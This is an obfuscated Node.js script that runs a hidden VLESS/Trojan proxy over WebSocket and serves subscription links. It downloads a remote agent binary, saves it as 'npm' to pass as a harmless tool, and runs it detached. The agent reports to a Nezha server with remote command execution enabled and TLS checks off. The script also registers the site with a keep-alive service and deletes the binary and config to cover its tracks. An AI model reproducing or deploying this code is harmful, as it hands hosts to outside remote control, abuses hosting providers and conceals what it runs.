const _0x5e1ec2=_0x3044;(function(_0x52dc80,_0x5cf90e){const _0x29f535=_0x3044,_0x399667=_0x52dc80();while(!![]){try{const _0x3a8c76=parseInt(_0x29f535(0xf8))/0x1+parseInt(_0x29f535(0xc2))/0x2*(-parseInt(_0x29f535(0xef))/0x3)+parseInt(_0x29f535(0xfd))/0x4+parseInt(_0x29f535(0xea))/0x5+parseInt(_0x29f535(0xb9))/0x6*(parseInt(_0x29f535(0x10b))/0x7)+-parseInt(_0x29f535(0xfc))/0x8*(-parseInt(_0x29f535(0xba))/0x9)+-parseInt(_0x29f535(0xd1))/0xa*(parseInt(_0x29f535(0x11d))/0xb);if(_0x3a8c76===_0x5cf90e)break;else _0x399667['push'](_0x399667['shift']());}catch(_0x3372cb){_0x399667['push'](_0x399667['shift']());}}}(_0x3042,0x93886));const os=require('os'),http=require(_0x5e1ec2(0xee)),fs=require('fs'),axios=require(_0x5e1ec2(0xed)),net=require('net'),path=require(_0x5e1ec2(0xae)),crypto=require(_0x5e1ec2(0xfa)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x5e1ec2(0xb1)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5e1ec2(0xd4)][_0x5e1ec2(0xad)]||_0x5e1ec2(0xf9),NEZHA_SERVER=process['env'][_0x5e1ec2(0x10d)]||'',NEZHA_PORT=process[_0x5e1ec2(0xd4)][_0x5e1ec2(0x9e)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process[_0x5e1ec2(0xd4)][_0x5e1ec2(0xbf)]||_0x5e1ec2(0xb7),AUTO_ACCESS=process[_0x5e1ec2(0xd4)][_0x5e1ec2(0xdd)]||!![],WSPATH=process[_0x5e1ec2(0xd4)][_0x5e1ec2(0xa6)]||UUID[_0x5e1ec2(0xbe)](0x0,0x8),SUB_PATH=process[_0x5e1ec2(0xd4)][_0x5e1ec2(0xcd)]||'troless-sub',NAME=process[_0x5e1ec2(0xd4)][_0x5e1ec2(0xa4)]||_0x5e1ec2(0x118),PORT=process['env'][_0x5e1ec2(0xf7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x38b87a=_0x5e1ec2;try{const _0x21a748=await axios[_0x38b87a(0x11c)](_0x38b87a(0x117)),_0x5a5ffe=_0x21a748[_0x38b87a(0x103)];ISP=(_0x5a5ffe[_0x38b87a(0x109)]+'-'+_0x5a5ffe[_0x38b87a(0xbb)])[_0x38b87a(0x112)](/ /g,'_');}catch(_0x29867d){ISP=_0x38b87a(0xc1);}};function _0x3044(_0x365240,_0x4ededa){const _0x30426f=_0x3042();return _0x3044=function(_0x3044ce,_0x5e2f38){_0x3044ce=_0x3044ce-0x98;let _0x3c1588=_0x30426f[_0x3044ce];return _0x3c1588;},_0x3044(_0x365240,_0x4ededa);}GetISP();const httpServer=http[_0x5e1ec2(0x100)]((_0x202188,_0x1b7590)=>{const _0x22add8=_0x5e1ec2;if(_0x202188[_0x22add8(0xf3)]==='/'){const _0x19c2c2=path[_0x22add8(0xdf)](__dirname,_0x22add8(0xa7));fs[_0x22add8(0xb6)](_0x19c2c2,_0x22add8(0xc8),(_0x4c1952,_0x4f0ba0)=>{const _0x4e4ab0=_0x22add8;if(_0x4c1952){_0x1b7590[_0x4e4ab0(0xe8)](0xc8,{'Content-Type':_0x4e4ab0(0xda)}),_0x1b7590[_0x4e4ab0(0xe4)]('Hello\x20world!');return;}_0x1b7590[_0x4e4ab0(0xe8)](0xc8,{'Content-Type':_0x4e4ab0(0xda)}),_0x1b7590[_0x4e4ab0(0xe4)](_0x4f0ba0);});return;}else{if(_0x202188['url']==='/'+SUB_PATH){const _0x153da2=_0x22add8(0xa3)+UUID+'@'+DOMAIN+_0x22add8(0xe0)+DOMAIN+_0x22add8(0xe6)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x57adf3=_0x22add8(0xe1)+UUID+'@'+DOMAIN+_0x22add8(0xa8)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x22add8(0x9d)+WSPATH+'#'+NAME+'-'+ISP,_0x5d1bcb=_0x153da2+'\x0a'+_0x57adf3,_0x4effbf=Buffer[_0x22add8(0xec)](_0x5d1bcb)['toString'](_0x22add8(0xd2));_0x1b7590['writeHead'](0xc8,{'Content-Type':_0x22add8(0xaa)}),_0x1b7590[_0x22add8(0xe4)](_0x4effbf+'\x0a');}else _0x1b7590[_0x22add8(0xe8)](0x194,{'Content-Type':'text/plain'}),_0x1b7590['end'](_0x22add8(0xe7));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x5e1ec2(0x112)](/-/g,''),DNS_SERVERS=[_0x5e1ec2(0xcc),_0x5e1ec2(0x119)];function _0x3042(){const _0x262a33=['1234.abc.com','Answer','348ClLrwT','257031POPrZv','asOrganization','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','setsid\x20nohup\x20./npm\x20-s\x20','slice','DOMAIN','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Unknown','172kVJRLV','Failed\x20to\x20resolve\x20','npm\x20running\x20error:','post','https://dns.google/resolve?name=','includes','utf8','length','Automatic\x20Access\x20Task\x20added\x20successfully','listen','8.8.4.4','SUB_PATH','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','createHash','toString','8520920atUsrf','base64','arm64','env','npm','8443','split','connection','2087','text/html','pipe','log','AUTO_ACCESS','true','join',':443?encryption=none&security=tls&sni=','trojan://','utf-8','writeFileSync','end','\x20-p\x20','&fp=chrome&type=ws&host=','Not\x20Found\x0a','writeHead','npm\x20download\x20successfully','3160485ZsHhaz','find','from','axios','http','25539azbjzw','2083','map','application/dns-json','url','write','stream','once','PORT','648062ChThFX','ce666bf4-61c7-4233-8521-059d3236d960','crypto','trim','192mPysGX','1552972saRaNP','digest','https://amd64.ssss.nyc.mn/agent','createServer','aarch64','\x20with\x20all\x20DNS\x20servers','data','sha224','hex','https://arm64.ssss.nyc.mn/agent','createWriteStream','chmod\x20+x\x20npm','country','Server\x20is\x20running\x20on\x20port\x20','82887IyIujB','catch','NEZHA_SERVER','error','/bin/bash','arm','https://arm64.ssss.nyc.mn/v1','replace','type','https://oooo.serv00.net/add-url','message','false','https://speed.cloudflare.com/meta','Hug','1.1.1.1','reduce','then','get','22ZZtEBy','2053','readUInt8','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','every','update','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','&path=%2F','NEZHA_PORT','unlink','config.yaml','client_secret:\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','vless://','NAME','--tls','WSPATH','index.html',':443?security=tls&sni=','connect','text/plain','readUInt16BE','close','UUID','path','Status','npm\x20is\x20running','child_process','concat','2096','pop','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','readFile'];_0x3042=function(){return _0x262a33;};return _0x3042();}function resolveHost(_0x26ee21){return new Promise((_0x25e06f,_0xff2dc4)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x26ee21)){_0x25e06f(_0x26ee21);return;}let _0x294601=0x0;function _0x32d6c4(){const _0x29945a=_0x3044;if(_0x294601>=DNS_SERVERS[_0x29945a(0xc9)]){_0xff2dc4(new Error(_0x29945a(0xc3)+_0x26ee21+_0x29945a(0x102)));return;}const _0x49cf55=DNS_SERVERS[_0x294601];_0x294601++;const _0x2809a4=_0x29945a(0xc6)+encodeURIComponent(_0x26ee21)+'&type=A';axios[_0x29945a(0x11c)](_0x2809a4,{'timeout':0x1388,'headers':{'Accept':_0x29945a(0xf2)}})[_0x29945a(0x11b)](_0x3a02bd=>{const _0x1fc164=_0x29945a,_0x6be2d7=_0x3a02bd[_0x1fc164(0x103)];if(_0x6be2d7[_0x1fc164(0xaf)]===0x0&&_0x6be2d7[_0x1fc164(0xb8)]&&_0x6be2d7[_0x1fc164(0xb8)][_0x1fc164(0xc9)]>0x0){const _0x3a3d01=_0x6be2d7[_0x1fc164(0xb8)][_0x1fc164(0xeb)](_0x4f7eb7=>_0x4f7eb7[_0x1fc164(0x113)]===0x1);if(_0x3a3d01){_0x25e06f(_0x3a3d01[_0x1fc164(0x103)]);return;}}_0x32d6c4();})[_0x29945a(0x10c)](_0x56914c=>{_0x32d6c4();});}_0x32d6c4();});}function handleVlessConnection(_0x44ab61,_0x178dc2){const _0x1b4017=_0x5e1ec2,[_0x1398f0]=_0x178dc2,_0x3410db=_0x178dc2[_0x1b4017(0xbe)](0x1,0x11);if(!_0x3410db[_0x1b4017(0x9a)]((_0x3352d0,_0x5dea46)=>_0x3352d0==parseInt(uuid['substr'](_0x5dea46*0x2,0x2),0x10)))return![];let _0x423295=_0x178dc2[_0x1b4017(0xbe)](0x11,0x12)[_0x1b4017(0x98)]()+0x13;const _0x7d6701=_0x178dc2['slice'](_0x423295,_0x423295+=0x2)[_0x1b4017(0xab)](0x0),_0x4c4dad=_0x178dc2[_0x1b4017(0xbe)](_0x423295,_0x423295+=0x1)[_0x1b4017(0x98)](),_0x56f169=_0x4c4dad==0x1?_0x178dc2[_0x1b4017(0xbe)](_0x423295,_0x423295+=0x4)[_0x1b4017(0xdf)]('.'):_0x4c4dad==0x2?new TextDecoder()['decode'](_0x178dc2[_0x1b4017(0xbe)](_0x423295+0x1,_0x423295+=0x1+_0x178dc2[_0x1b4017(0xbe)](_0x423295,_0x423295+0x1)['readUInt8']())):_0x4c4dad==0x3?_0x178dc2[_0x1b4017(0xbe)](_0x423295,_0x423295+=0x10)[_0x1b4017(0x11a)]((_0xa843d8,_0x1f1438,_0x20b5b6,_0x14b1b6)=>_0x20b5b6%0x2?_0xa843d8[_0x1b4017(0xb2)](_0x14b1b6[_0x1b4017(0xbe)](_0x20b5b6-0x1,_0x20b5b6+0x1)):_0xa843d8,[])[_0x1b4017(0xf1)](_0x3538a6=>_0x3538a6[_0x1b4017(0xab)](0x0)[_0x1b4017(0xd0)](0x10))[_0x1b4017(0xdf)](':'):'';_0x44ab61['send'](new Uint8Array([_0x1398f0,0x0]));const _0x4c39a3=createWebSocketStream(_0x44ab61);return resolveHost(_0x56f169)[_0x1b4017(0x11b)](_0x5c723d=>{const _0x24c749=_0x1b4017;net[_0x24c749(0xa9)]({'host':_0x5c723d,'port':_0x7d6701},function(){const _0x4c2e2c=_0x24c749;this[_0x4c2e2c(0xf4)](_0x178dc2[_0x4c2e2c(0xbe)](_0x423295)),_0x4c39a3['on']('error',()=>{})['pipe'](this)['on'](_0x4c2e2c(0x10e),()=>{})[_0x4c2e2c(0xdb)](_0x4c39a3);})['on']('error',()=>{});})[_0x1b4017(0x10c)](_0x267629=>{const _0x1aa885=_0x1b4017;net['connect']({'host':_0x56f169,'port':_0x7d6701},function(){const _0x1932d2=_0x3044;this[_0x1932d2(0xf4)](_0x178dc2['slice'](_0x423295)),_0x4c39a3['on'](_0x1932d2(0x10e),()=>{})['pipe'](this)['on'](_0x1932d2(0x10e),()=>{})[_0x1932d2(0xdb)](_0x4c39a3);})['on'](_0x1aa885(0x10e),()=>{});}),!![];}function handleTrojanConnection(_0x37540e,_0x4d3738){const _0x40405a=_0x5e1ec2;try{if(_0x4d3738['length']<0x3a)return![];const _0x24a5ab=_0x4d3738[_0x40405a(0xbe)](0x0,0x38)['toString'](),_0x3aab16=[UUID];let _0x5db9b0=null;for(const _0x5c7f63 of _0x3aab16){const _0x1c2b4a=crypto[_0x40405a(0xcf)](_0x40405a(0x104))[_0x40405a(0x9b)](_0x5c7f63)[_0x40405a(0xfe)](_0x40405a(0x105));if(_0x1c2b4a===_0x24a5ab){_0x5db9b0=_0x5c7f63;break;}}if(!_0x5db9b0)return![];let _0xa1ac=0x38;_0x4d3738[_0xa1ac]===0xd&&_0x4d3738[_0xa1ac+0x1]===0xa&&(_0xa1ac+=0x2);const _0x166086=_0x4d3738[_0xa1ac];if(_0x166086!==0x1)return![];_0xa1ac+=0x1;const _0x1266df=_0x4d3738[_0xa1ac];_0xa1ac+=0x1;let _0xccb6f4,_0x25a3ba;if(_0x1266df===0x1)_0xccb6f4=_0x4d3738['slice'](_0xa1ac,_0xa1ac+0x4)['join']('.'),_0xa1ac+=0x4;else{if(_0x1266df===0x3){const _0x54dcd8=_0x4d3738[_0xa1ac];_0xa1ac+=0x1,_0xccb6f4=_0x4d3738['slice'](_0xa1ac,_0xa1ac+_0x54dcd8)['toString'](),_0xa1ac+=_0x54dcd8;}else{if(_0x1266df===0x4)_0xccb6f4=_0x4d3738['slice'](_0xa1ac,_0xa1ac+0x10)[_0x40405a(0x11a)]((_0x29dcb9,_0xb6d1f4,_0x251a27,_0x3f6159)=>_0x251a27%0x2?_0x29dcb9[_0x40405a(0xb2)](_0x3f6159[_0x40405a(0xbe)](_0x251a27-0x1,_0x251a27+0x1)):_0x29dcb9,[])['map'](_0x38eea9=>_0x38eea9[_0x40405a(0xab)](0x0)[_0x40405a(0xd0)](0x10))[_0x40405a(0xdf)](':'),_0xa1ac+=0x10;else return![];}}_0x25a3ba=_0x4d3738[_0x40405a(0xab)](_0xa1ac),_0xa1ac+=0x2;_0xa1ac<_0x4d3738[_0x40405a(0xc9)]&&_0x4d3738[_0xa1ac]===0xd&&_0x4d3738[_0xa1ac+0x1]===0xa&&(_0xa1ac+=0x2);const _0x2112f6=createWebSocketStream(_0x37540e);return resolveHost(_0xccb6f4)[_0x40405a(0x11b)](_0x465f58=>{const _0x2494af=_0x40405a;net[_0x2494af(0xa9)]({'host':_0x465f58,'port':_0x25a3ba},function(){const _0x26bab4=_0x2494af;_0xa1ac<_0x4d3738[_0x26bab4(0xc9)]&&this[_0x26bab4(0xf4)](_0x4d3738['slice'](_0xa1ac)),_0x2112f6['on']('error',()=>{})['pipe'](this)['on'](_0x26bab4(0x10e),()=>{})[_0x26bab4(0xdb)](_0x2112f6);})['on'](_0x2494af(0x10e),()=>{});})['catch'](_0x30ec28=>{const _0x5c5894=_0x40405a;net[_0x5c5894(0xa9)]({'host':_0xccb6f4,'port':_0x25a3ba},function(){const _0x1dfe09=_0x5c5894;_0xa1ac<_0x4d3738['length']&&this[_0x1dfe09(0xf4)](_0x4d3738[_0x1dfe09(0xbe)](_0xa1ac)),_0x2112f6['on'](_0x1dfe09(0x10e),()=>{})[_0x1dfe09(0xdb)](this)['on'](_0x1dfe09(0x10e),()=>{})[_0x1dfe09(0xdb)](_0x2112f6);})['on']('error',()=>{});}),!![];}catch(_0x3ae6be){return![];}}wss['on'](_0x5e1ec2(0xd8),(_0x371169,_0x219117)=>{const _0x271b5c=_0x5e1ec2,_0x58dc64=_0x219117[_0x271b5c(0xf3)]||'';_0x371169[_0x271b5c(0xf6)](_0x271b5c(0x115),_0x47ce96=>{const _0xfc5424=_0x271b5c;if(_0x47ce96[_0xfc5424(0xc9)]>0x11&&_0x47ce96[0x0]===0x0){const _0x22d3d7=_0x47ce96[_0xfc5424(0xbe)](0x1,0x11),_0x1b5ed7=_0x22d3d7['every']((_0x4bc540,_0x52a3bf)=>_0x4bc540==parseInt(uuid['substr'](_0x52a3bf*0x2,0x2),0x10));if(_0x1b5ed7){!handleVlessConnection(_0x371169,_0x47ce96)&&_0x371169[_0xfc5424(0xac)]();return;}}!handleTrojanConnection(_0x371169,_0x47ce96)&&_0x371169[_0xfc5424(0xac)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x1c3df1=_0x5e1ec2,_0x5a8ce5=os['arch']();return _0x5a8ce5===_0x1c3df1(0x110)||_0x5a8ce5===_0x1c3df1(0xd3)||_0x5a8ce5===_0x1c3df1(0x101)?!NEZHA_PORT?_0x1c3df1(0x111):_0x1c3df1(0x106):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x1c3df1(0xff);},downloadFile=async()=>{const _0x36cb30=_0x5e1ec2;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5bf1ed=getDownloadUrl(),_0x23483f=await axios({'method':_0x36cb30(0x11c),'url':_0x5bf1ed,'responseType':_0x36cb30(0xf5)}),_0x4921ac=fs[_0x36cb30(0x107)](_0x36cb30(0xd5));return _0x23483f[_0x36cb30(0x103)]['pipe'](_0x4921ac),new Promise((_0x2212e5,_0x4b5d75)=>{const _0x3f73c8=_0x36cb30;_0x4921ac['on']('finish',()=>{const _0x51950a=_0x3044;console[_0x51950a(0xdc)](_0x51950a(0xe9)),exec(_0x51950a(0x108),_0x43fb85=>{if(_0x43fb85)_0x4b5d75(_0x43fb85);_0x2212e5();});}),_0x4921ac['on'](_0x3f73c8(0x10e),_0x4b5d75);});}catch(_0x4fc6ab){throw _0x4fc6ab;}},runnz=async()=>{const _0x4f9a23=_0x5e1ec2;try{const _0x1ea17c=execSync(_0x4f9a23(0xb5),{'encoding':_0x4f9a23(0xe2)});if(_0x1ea17c[_0x4f9a23(0xfb)]()!==''){console[_0x4f9a23(0xdc)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x42f891){}await downloadFile();let _0x441d84='',_0x5c902e=['443',_0x4f9a23(0xd6),_0x4f9a23(0xb3),_0x4f9a23(0xd9),_0x4f9a23(0xf0),_0x4f9a23(0x11e)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5dfa39=_0x5c902e[_0x4f9a23(0xc7)](NEZHA_PORT)?_0x4f9a23(0xa5):'';_0x441d84=_0x4f9a23(0xbd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4f9a23(0xe5)+NEZHA_KEY+'\x20'+_0x5dfa39+_0x4f9a23(0x9c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x22389a=NEZHA_SERVER[_0x4f9a23(0xc7)](':')?NEZHA_SERVER[_0x4f9a23(0xd7)](':')[_0x4f9a23(0xb4)]():'',_0x170320=_0x5c902e[_0x4f9a23(0xc7)](_0x22389a)?_0x4f9a23(0xde):_0x4f9a23(0x116),_0x4a1e60=_0x4f9a23(0xa1)+NEZHA_KEY+_0x4f9a23(0xbc)+NEZHA_SERVER+_0x4f9a23(0xc0)+_0x170320+_0x4f9a23(0x99)+UUID;fs[_0x4f9a23(0xe3)](_0x4f9a23(0xa0),_0x4a1e60);}_0x441d84=_0x4f9a23(0xce);}else{console[_0x4f9a23(0xdc)](_0x4f9a23(0xa2));return;}}try{exec(_0x441d84,{'shell':_0x4f9a23(0x10f)},_0x4c427f=>{const _0x40f6a0=_0x4f9a23;if(_0x4c427f)console[_0x40f6a0(0x10e)](_0x40f6a0(0xc4),_0x4c427f);else console[_0x40f6a0(0xdc)](_0x40f6a0(0xb0));});}catch(_0x26d689){console[_0x4f9a23(0x10e)]('error:\x20'+_0x26d689);}};async function addAccessTask(){const _0xfba7de=_0x5e1ec2;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x559434='https://'+DOMAIN;try{const _0xc2fb2e=await axios[_0xfba7de(0xc5)](_0xfba7de(0x114),{'url':_0x559434},{'headers':{'Content-Type':'application/json'}});console[_0xfba7de(0xdc)](_0xfba7de(0xca));}catch(_0x22ed89){}}const delFiles=()=>{const _0x3c0e48=_0x5e1ec2;fs[_0x3c0e48(0x9f)](_0x3c0e48(0xd5),()=>{}),fs[_0x3c0e48(0x9f)]('config.yaml',()=>{});};httpServer[_0x5e1ec2(0xcb)](PORT,()=>{const _0x3e99aa=_0x5e1ec2;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x3e99aa(0x10a)+PORT);});
